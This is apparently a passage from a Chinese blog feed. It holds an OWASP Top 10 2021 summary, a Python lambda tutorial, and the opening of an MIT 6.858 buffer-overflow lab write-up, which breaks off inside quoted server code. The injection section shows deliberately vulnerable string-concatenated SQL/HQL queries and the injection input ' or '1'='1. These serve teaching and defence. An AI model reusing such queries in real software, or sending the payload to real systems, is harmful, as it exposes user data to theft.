href="https://cwe.mitre.org/data/definitions/259.html">CWE-259：使用硬编码密码</a>：软件包含一个硬编码的密码，它将其用于自己的入站身份验证或与外部组件的出站通信。</li><li><a href="https://cwe.mitre.org/data/definitions/327.html">CWE-327：使用损坏或有风险的加密算法</a>：使用损坏或有风险的加密算法是危险的，可能导致敏感信息的暴露。</li><li><a href="https://cwe.mitre.org/data/definitions/331.html">CWE-331： 熵不足</a>：软件使用的算法或方案产生的熵不足，留下比其他算法或更可能发生的模式或值簇。（某些值产生的随机性太差容易被猜测）</li></ul><h3 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h3><p>确定资料的传输防护需求，举例来说，密码、银行卡号、健康记录、个人资产以及商业秘密等被隐私保护法保护的信息，对于这些资料需要考虑以下问题：</p><ul><li>是否以明文形式传输任何数据？需要关注的协议包括HTTP、SMTP、FTP等未加密协议。外部互联网流量是危险的。 验证所有内部流量，例如负载平衡器、Web 服务器或后端系统之间的流量。</li><li>是否有任何过时的或脆弱的加密演算法被预设使用或存在于较旧的程序代码?</li><li>是否正在使用默认的加密密钥、是否生成了弱加密密钥并重复使用，是否有适当的密钥管理或轮换?加密密钥是否被写入源代码中？</li><li>是否强制执行加密？</li><li>收到的服务器证书和信任链是否正确验证？</li></ul><h3 id="预防方法-1"><a href="#预防方法-1" class="headerlink" title="预防方法"></a>预防方法</h3><ul><li>对应用程序处理存储传输的数据进行分类，根据隐私法、法令法规或商业需求辨认哪些为敏感资料，并按照分类结果执行对应的控制措施。</li><li>非必要不存储敏感性资料，不存储的数据是不会被窃取的。</li><li>确保静态敏感性资料加密（比如数据库里存储的敏感数据</li><li>确认使用最新版且标准的强算法、协定及密钥；适当的使用密钥管理（比如采用KMS（Key Management Service）？</li><li>使用安全协议加密传输中的所有数据，例如具有前向保密 (FS) 密码的 TLS、服务器的密码和安全参数优先。 使用 HTTP 严格传输安全 (HSTS) 等指令强制加密。（HSTS 是 HTTP 严格传输安全（HTTP Strict Transport Security） 的缩写。 这是一种网站用来声明他们只能使用安全连接（HTTPS）访问的方法。 如果一个网站声明了 HSTS 策略，浏览器必须拒绝所有的 HTTP 连接并阻止用户接受不安全的 SSL 证书。 目前大多数主流浏览器都支持 HSTS）</li><li>包含敏感数据的响应应当禁止缓存。</li><li>使用具有散列&#x2F;延迟因素(work factor&#x2F;delay factor)，如 Argon2, scrypt, bcrypt 或 PBKDF2 的强自适应加盐散列函数来存储密码。</li><li>独立验证配置和设置的有效性。</li></ul><h3 id="攻击情景实例-1"><a href="#攻击情景实例-1" class="headerlink" title="攻击情景实例"></a>攻击情景实例</h3><p><strong>情境 #1</strong>: 有一个应用程序使用自动化资料库加密来加密资料库中的信用卡卡号，但是资料被检索时是被自动解密的，进而允许通过 SQL 注入缺陷来检索信用卡卡号明文。</p><p><strong>情境 #2</strong>: 有一个平台没有对所有页面强制使用 TLS ，攻击者监控网络流量(如在不安全的无线网络), 将连线从 HTTPS 降级成 HTTP，并拦截请求窃取使用者的会话(session) cookies，之后攻击者重送窃取到的会话(session) cookies 并劫持用户(认证过的)的会话，进而检索或修改使用者的隐私资料。 除了上述以外，攻击者也能修改传输的数据，如汇款收款人。</p><p><strong>情境 #3</strong>: 密码资料库使用未加盐或简单的散列函数来储存每个人的密码，一个档案上传的缺陷可以让攻击者存取密码资料库，所有未被加盐的哈希可以被预先计算好的彩虹表解密。即使加盐，由简单或快速的哈希仍能被 GPU 破解。</p><h2 id="A03-注入式攻击"><a href="#A03-注入式攻击" class="headerlink" title="A03 注入式攻击"></a>A03 注入式攻击</h2><h3 id="简述-2"><a href="#简述-2" class="headerlink" title="简述"></a>简述</h3><p>注入式攻击下滑到了第三名，94%的被测应用程序都有检测到某种类型的注入式攻击问题。著名的CWE包括：</p><ul><li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79：网页生成期间输入的不当中和（“跨站点脚本”）)</a>：应用不会抵消或错误的抵消用户可控的输入，然后将其放入输出中，该输出用作提供给其他用户的网页。</li><li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89：SQL 命令中使用的特殊元素的不当中和（“SQL 注入”）</a>：如果不在用户可控制的输入中充分删除或引用 SQL 语法，生成的 SQL 查询可能会导致这些输入被解释为 SQL 而不是普通用户数据。这可用于更改查询逻辑以绕过安全检查，或插入修改后端数据库的其他语句，可能包括执行系统命令。</li><li><a href="https://cwe.mitre.org/data/definitions/73.html">CWE-73：文件名或路径的外部控制</a>：软件允许用户输入来控制或影响文件系统操作中使用的路径或文件名。</li></ul><h3 id="描述-2"><a href="#描述-2" class="headerlink" title="描述"></a>描述</h3><p>应用程序在以下情况下容易遭受攻击：</p><ul><li>应用程序未验证、过滤或者清理使用者提供的资料。</li><li>在解释器中未使用上下文感知转义的动态查询或者无参数调用</li><li>在对象关系映射（ORM）的搜索参数中使用恶意的数据来提取额外的敏感数据。</li><li>恶意数据被直接使用或者连接，SQL语句或者命令包含动态查询、命令或存储过程中的结构和恶意数据。</li></ul><p>一些常见的注入式攻击是 SQL、NoSQL、OS 指令、对象关系映射 (ORM)、LDAP 以及表达式语言 (EL) 或对象导航图语言 (OGNL) 注入。这个概念在所有的解释器都是相同的。假若应用程式存在注入式攻击的弱点，源码检测是最好的方式。强烈建议对所有输入的参数、标头、URL、cookies、JSON、SOAP（简单对象访问协议） 以及 XML 的数据进行自动化测试。组织可以将静态源码测试 (SAST) 以及动态应用程序检测 (DAST) 工具，包含到持续整合与持续部署 (CI&#x2F;CD)管道中，以达成在上线部署前能识别注入攻击的缺陷。</p><h3 id="预防方法-2"><a href="#预防方法-2" class="headerlink" title="预防方法"></a>预防方法</h3><ul><li>将命令于查询数据分离，防止注入式攻击。</li><li>使用安全的API，避免使用解释器，以提供参数化界面或整合到对象关系映射工具中</li><li>使用白名单在服务器端验证输入的数据。</li><li>对于任何剩余的动态查询，在转译中使用特殊符号进行查询，给查询语法带来不同的含义。注意：表名等无法被转义，因此使用者提供数据结构名称时危险操作</li><li>在查询中使用 LIMIT 以及其它的 SQL 控制器，可以防止当遭受 SQL 注入式攻击时被大量泄露纪录。</li></ul><h3 id="攻击情景实例-2"><a href="#攻击情景实例-2" class="headerlink" title="攻击情景实例"></a>攻击情景实例</h3><p><strong>情境 #1:</strong> 应用程序在脆弱的 SQL 调用中使用了不被信任的数据：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">query</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SELECT * FROM accounts WHERE custID=&#x27;&quot;</span> + request.getParameter(<span class="hljs-string">&quot;id&quot;</span>) + <span class="hljs-string">&quot;&#x27;&quot;</span>;<br></code></pre></td></tr></table></figure><p><strong>情境 #2:</strong> 类似地，应用程序对框架的盲目信任，可能导致仍然在漏洞的查询，(例如：Hibernate 查询语言 (HQL))：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Query</span> <span class="hljs-variable">HQLQuery</span> <span class="hljs-operator">=</span> session.createQuery(<span class="hljs-string">&quot;FROM accounts WHERE custID=&#x27;&quot;</span> + request.getParameter(<span class="hljs-string">&quot;id&quot;</span>) + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br></code></pre></td></tr></table></figure><p>在这两个情境中，攻击者在他们的浏览器修改了 “id” 参数值，送出 ‘ or ‘1’&#x3D;’1，例如：</p><p><a href="http://example.com/app/accountView?id=&#39;">http://example.com/app/accountView?id=&#39;</a> or ‘1’&#x3D;’1</p><p>这两个查询的含义将产生改变，而响应所有帐户数据表中的记录，更危险的攻击将可能修改或删除数据。</p><h2 id="A04-不安全的设计"><a href="#A04-不安全的设计" class="headerlink" title="A04 不安全的设计"></a>A04 不安全的设计</h2><h3 id="简述-3"><a href="#简述-3" class="headerlink" title="简述"></a>简述</h3><p>2021年中全新的一个类别，着重于在设计和架构中的风险。呼吁使用更多的威胁建模、安全设计模式与参考架构。著名的CWE包括：</p><ul><li><a href="https://cwe.mitre.org/data/definitions/209.html">CWE-209：生成包含敏感信息的错误消息</a>：软件会生成一条错误消息，其中包含有关其环境、用户或关联数据的敏感信息。</li><li><a href="https://cwe.mitre.org/data/definitions/256.html">CWE-256：密码的纯文本存储</a>：当密码以纯文本形式存储在应用程序的属性、配置文件或内存中时，会出现密码管理问题。通过在配置文件中存储纯文本密码，可以读取该文件的任何人都可以访问受密码保护的资源。在某些情况下，如果在使用密码后未立即清除密码，则即使在内存中存储纯文本密码也被视为安全风险。</li><li><a href="https://cwe.mitre.org/data/definitions/501.html">CWE-501： 信任边界违规</a>：可以将信任边界视为通过程序绘制的线。在这条线的一侧，数据是不可信的。在线路的另一端，假定数据是可信的。验证逻辑的目的是允许数据安全地跨越信任边界 - 从不受信任的移动到受信任的。当程序模糊了受信任内容和不受信任的内容之间的界限时，就会发生信任边界冲突。通过将可信和不受信任的数据合并到同一数据结构中，程序员更容易错误地信任未经验证的数据。</li><li><a href="https://cwe.mitre.org/data/definitions/522.html">CWE-522：凭据保护不足</a>：产品传输或存储身份验证凭据，但它使用不安全的方法，该方法容易受到未经授权的拦截和&#x2F;或检索。</li></ul><h3 id="描述-3"><a href="#描述-3" class="headerlink" title="描述"></a>描述</h3><p>不安全的设计是一个广泛的类别呈现许多不同的弱点，代表为“缺乏或无效的控制设计”。不安全的设计并不是所有其他10大类风险类别的根源，不安全的设计和不安全的实现是有区别的。我们去区分设计缺陷和实现缺陷是有原因的，他们有不同的根本原因和补救措施。安全设计可能仍然会存在实现上的缺陷，导致可能被利用的漏洞，但是一个不安全的设计不可能通过一个完美的实现来修复，因为根据定义，所需要的安全控制从来没有创建用于防御特定的攻击。导致不安全的设计的因素之一是缺乏对正在开发的软甲或者系统中固有的业务风险分析，因此无法确定需要什么级别的安全设计。</p><h4 id="需求和资源管理"><a href="#需求和资源管理" class="headerlink" title="需求和资源管理"></a>需求和资源管理</h4><p>收集应用程序的业务要求并与业务部门协商，包括有关所有数据资产的机密性、完整性、可用性和真实性，以及预期业务逻辑的保护要求。考虑应用程序的公开程度以及是否需要隔离（除了访问控制之外）。编写技术要求，包括功能性和非功能性的安全要求。</p><h4 id="安全设计"><a href="#安全设计" class="headerlink" title="安全设计"></a>安全设计</h4><p>安全设计是一种文化和方法，它不断评估威胁，并确保代码经过稳健的设计和测试，防止已知的攻击方法。威胁建模纳入细化的会议，查找数据流和访问控制或者其他安全组件中的更改。安全设计既不是附加组件，也不是可以添加到软件中的工具。</p><h4 id="安全的开发的生命周期"><a href="#安全的开发的生命周期" class="headerlink" title="安全的开发的生命周期"></a>安全的开发的生命周期</h4><p>安全软件需要安全的开发生命周期、某种形式的安全设计模式、铺砌的道路方法、安全的组件库、工具和威胁建模。</p><h3 id="预防方法-3"><a href="#预防方法-3" class="headerlink" title="预防方法"></a>预防方法</h3><ul><li>与应用安全专业人员一起建立和使用安全的开发生命周期，以帮助评估和设计与安全和隐私相关的控制措施</li><li>建立和使用安全设计模式库或者已经铺设道路的即用型组件</li><li>将威胁模型用于关键身份认证、访问控制、业务逻辑和密钥流</li><li>将安全语言和控件集成到用户情景中</li><li>在应用程序的每一层集成合理性检查</li><li>编写单元和集成测试以验证所有关键流是否都能抵御威胁模型，为应用程序的每一层编写用例和误用案例</li><li>根据暴露和保护需求，在系统层和网络层上设置隔离层</li><li>通过设计在所有层中强有力的隔离租户</li><li>按用户或服务限制资源消耗</li></ul><h3 id="攻击情景实例-3"><a href="#攻击情景实例-3" class="headerlink" title="攻击情景实例"></a>攻击情景实例</h3><p><strong>场景 #1：</strong>凭据恢复工作流可能包括 NIST 800-63b、OWASP ASVS 和 OWASP 前 10 名所禁止的“问题和答案”。问题和答案不能被信任为身份的证据，由于不止一个人可以知道答案，因此它们被禁止。应该删除此类代码，并将其替换为更安全的设计。</p><p><strong>场景 #2：</strong> 电影院在要求押金前允许团体预订折扣并且最多有 15 名观众。攻击者可以威胁模型此流程并测试他们在一次请求中是否可以预订 600 个座位和的所有电影院，导致电影院巨大的收入损失。</p><p><strong>场景 #3：</strong>零售连锁店的电子商务网站没有针对黄牛购买高端显卡转售拍卖网站所运行的机器人的保护，这将造成正常的购买者无法买到显卡。仔细的反机器人设计和域逻辑规则（例如在可用后几秒钟内进行的购买）可能会识别不真实的购买并拒绝此类交易。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python lambda匿名函数妙用</title>
    <link href="/blog/2022/06/29/Python-lambda%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0%E5%A6%99%E7%94%A8/"/>
    <url>/blog/2022/06/29/Python-lambda%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0%E5%A6%99%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><strong>最近一直在坚持leetcode每日一题，遇到了一种很有意思且方便的lambda匿名函数，记录一下备忘~</strong></p><p><img src="/images/fj58.jpg"></p><span id="more"></span><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p>lambda函数的语法非常简单，如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">lambda</span> [arg1 [,arg2,.....argn]]:expression<br></code></pre></td></tr></table></figure><p>举个栗子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">f = <span class="hljs-keyword">lambda</span> x,y:x+y<br>f(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<span class="hljs-comment">#结果就是1+2=3</span><br><br><span class="hljs-comment">#上述lambda表达式等价于下面的函数</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func_</span>(<span class="hljs-params">x,y</span>):<br>    <span class="hljs-keyword">return</span> x+y<br>func_(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>语法非常简单，但是可以和其他常用函数组合起来实现很多效果。</p><h2 id="将lambda函数作为参数传递给其他函数"><a href="#将lambda函数作为参数传递给其他函数" class="headerlink" title="将lambda函数作为参数传递给其他函数"></a>将lambda函数作为参数传递给其他函数</h2><h3 id="1-与map函数结合"><a href="#1-与map函数结合" class="headerlink" title="1.与map函数结合"></a>1.与map函数结合</h3><p><strong>map()</strong> 会根据提供的函数对指定序列做映射。</p><p>第一个参数 function 以参数序列中的每一个元素调用 function 函数，返回包含每次 function 函数返回值的新列表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">map</span>(function, iterable, ...)<br></code></pre></td></tr></table></figure><p>此时lambda函数用于指定对列表中每一个元素的共同操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 求两个列表元素的和</span><br><br><span class="hljs-meta">&gt;&gt;&gt; </span>a = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>b = [<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> x, y: x+y, a, b))<br>[<span class="hljs-number">6</span>, <span class="hljs-number">8</span>, <span class="hljs-number">10</span>, <span class="hljs-number">12</span>]<br><br></code></pre></td></tr></table></figure><h3 id="2-与filter函数结合"><a href="#2-与filter函数结合" class="headerlink" title="2.与filter函数结合"></a>2.与filter函数结合</h3><p><strong>filter()</strong> 函数用于过滤序列，过滤掉不符合条件的元素，返回由符合条件元素组成的新列表。</p><p>该接收两个参数，第一个为函数，第二个为序列，序列的每个元素作为参数传递给函数进行判断，然后返回 True 或 False，最后将返回 True 的元素放到新列表中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">filter</span>(function, iterable)<br></code></pre></td></tr></table></figure><p>此时lambda函数用于指定过滤列表元素的条件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 筛选偶数</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">list</span>(<span class="hljs-built_in">filter</span>(<span class="hljs-keyword">lambda</span> x: x%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>,  [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>]))<br>[<span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>]<br><br><span class="hljs-comment"># 等价于下面的列表推导式</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>l = [x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>] <span class="hljs-keyword">if</span> x%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>l<br>[<span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>]<br><br></code></pre></td></tr></table></figure><h3 id="3-与sorted函数结合"><a href="#3-与sorted函数结合" class="headerlink" title="3.与sorted函数结合"></a>3.与sorted函数结合</h3><p><strong>sorted()</strong> 函数对所有可迭代的对象进行排序操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">sorted</span>(iterable, cmp=<span class="hljs-literal">None</span>, key=<span class="hljs-literal">None</span>, reverse=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><p><strong>sort 与 sorted 区别：</strong></p><p>sort 是应用在 list 上的方法，sorted 可以对所有可迭代的对象进行排序操作。</p><p>list 的 sort 方法返回的是对已经存在的列表进行操作，无返回值，而内建函数 sorted 方法返回的是一个新的 list，而不是在原来的基础上进行的操作。</p><p>此时lambda函数用于指定对列表中所有元素进行排序的准则：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>info = [(<span class="hljs-string">&#x27;James&#x27;</span>,<span class="hljs-number">32</span>), (<span class="hljs-string">&#x27;Alies&#x27;</span>,<span class="hljs-number">20</span>), (<span class="hljs-string">&#x27;Wendy&#x27;</span>,<span class="hljs-number">25</span>)]<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">sorted</span>(info, key=<span class="hljs-keyword">lambda</span> age:age[<span class="hljs-number">1</span>])  <span class="hljs-comment"># 按照第二个元素，索引为1排序</span><br>[(<span class="hljs-string">&#x27;Alies&#x27;</span>, <span class="hljs-number">20</span>), (<span class="hljs-string">&#x27;Wendy&#x27;</span>, <span class="hljs-number">25</span>), (<span class="hljs-string">&#x27;James&#x27;</span>, <span class="hljs-number">32</span>)]<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">sorted</span>(info, key=<span class="hljs-keyword">lambda</span> age:-age[<span class="hljs-number">1</span>])<span class="hljs-comment"># 按照第二个元素，索引为1排序降序</span><br>[(<span class="hljs-string">&#x27;James&#x27;</span>, <span class="hljs-number">32</span>), (<span class="hljs-string">&#x27;Wendy&#x27;</span>, <span class="hljs-number">25</span>), (<span class="hljs-string">&#x27;Alies&#x27;</span>, <span class="hljs-number">20</span>)]<br></code></pre></td></tr></table></figure><h3 id="4-与reduce函数结合"><a href="#4-与reduce函数结合" class="headerlink" title="4.与reduce函数结合"></a>4.与reduce函数结合</h3><p><strong>reduce()</strong> 函数会对参数序列中元素进行累积。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">reduce(function, iterable[, initializer])<br></code></pre></td></tr></table></figure><p>此时lambda函数用于指定列表中两两相邻元素的结合条件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">&gt;&gt;&gt;<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">x, y</span>) : <span class="hljs-comment"># 两数相加</span><br><span class="hljs-meta">... </span>   <span class="hljs-keyword">return</span> x + y<br>...<br><span class="hljs-meta">&gt;&gt;&gt; </span>reduce(add, [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>]) <span class="hljs-comment"># 计算列表和：1+2+3+4+5</span><br><span class="hljs-number">15</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>reduce(<span class="hljs-keyword">lambda</span> x, y: x+y, [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>]) <span class="hljs-comment"># 使用 lambda 匿名函数</span><br><span class="hljs-number">15</span><br><br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>lambda 并不会带来程序运行效率的提高，只会使代码更简洁，可以与一些python内置函数使用，增加灵活性。</p>]]></content>
    
    
    
    <tags>
      
      <tag>leetcode</tag>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MIT6.858-计算机系统安全（一）</title>
    <link href="/blog/2022/06/10/MIT6-858-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/blog/2022/06/10/MIT6-858-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p><strong>很久很久没写博客了，准确来说是变懒了，看到实验室同学都在开始准备工作的事情了，想想自己也该开始谋划基础学习了，之前学过一些简单的软件与系统安全的堆栈溢出，现在想通过MIT的计算机系统安全课程再较为深入学习一下。</strong></p><p><img src="/images/fj57.jpg"></p><span id="more"></span><p>实验一链接地址：<a href="https://css.csail.mit.edu/6.858/2022/labs/lab1.html">6.858 &#x2F; 2022年春季 (mit.edu)</a></p><p>进程地址空间：</p><p><img src="/images/jcdzkj.png"></p><h2 id="一、查找缓冲区溢出"><a href="#一、查找缓冲区溢出" class="headerlink" title="一、查找缓冲区溢出"></a>一、查找缓冲区溢出</h2><h3 id="练习-1"><a href="#练习-1" class="headerlink" title="练习 1"></a>练习 1</h3><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">研究 Web 服务器的 C 代码（在 `zookd.c` 和 `http.c` 中），并找到一个允许攻击者覆盖函数返回地址的代码示例。提示：查找堆栈上分配的缓冲。对于您的漏洞，请描述可能溢出的缓冲区，如何构建Web服务器的输入（即HTTP请求）以溢出缓冲区并覆盖返回地址，以及将触发缓冲区溢出的调用堆栈（即从`process_client`开始的函数调用链）。<br></code></pre></td></tr></table></figure><p>zookd.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">process_client</span><span class="hljs-params">(<span class="hljs-type">int</span>)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">run_server</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *portstr)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">start_server</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *portstr)</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>)<br>        errx(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Wrong arguments&quot;</span>);<br><br>    run_server(argv[<span class="hljs-number">1</span>]);<br>&#125;<br><br><span class="hljs-comment">/* socket-bind-listen idiom */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">start_server</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *portstr)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">addrinfo</span> <span class="hljs-title">hints</span> =</span> &#123;<span class="hljs-number">0</span>&#125;, *res;<br>    <span class="hljs-type">int</span> sockfd;<br>    <span class="hljs-type">int</span> e, opt = <span class="hljs-number">1</span>;<br><br>    hints.ai_family = AF_UNSPEC;<br>    hints.ai_socktype = SOCK_STREAM;<br>    hints.ai_flags = AI_PASSIVE;<br><br>    <span class="hljs-keyword">if</span> ((e = getaddrinfo(<span class="hljs-literal">NULL</span>, portstr, &amp;hints, &amp;res)))<br>        errx(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;getaddrinfo: %s&quot;</span>, gai_strerror(e));<br>    <span class="hljs-keyword">if</span> ((sockfd = socket(res-&gt;ai_family, res-&gt;ai_socktype, res-&gt;ai_protocol)) &lt; <span class="hljs-number">0</span>)<br>        err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;socket&quot;</span>);<br>    <span class="hljs-keyword">if</span> (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &amp;opt, <span class="hljs-keyword">sizeof</span>(opt)))<br>        err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;setsockopt&quot;</span>);<br>    <span class="hljs-keyword">if</span> (fcntl(sockfd, F_SETFD, FD_CLOEXEC) &lt; <span class="hljs-number">0</span>)<br>        err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;fcntl&quot;</span>);<br>    <span class="hljs-keyword">if</span> (bind(sockfd, res-&gt;ai_addr, res-&gt;ai_addrlen))<br>        err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;bind&quot;</span>);<br>    <span class="hljs-keyword">if</span> 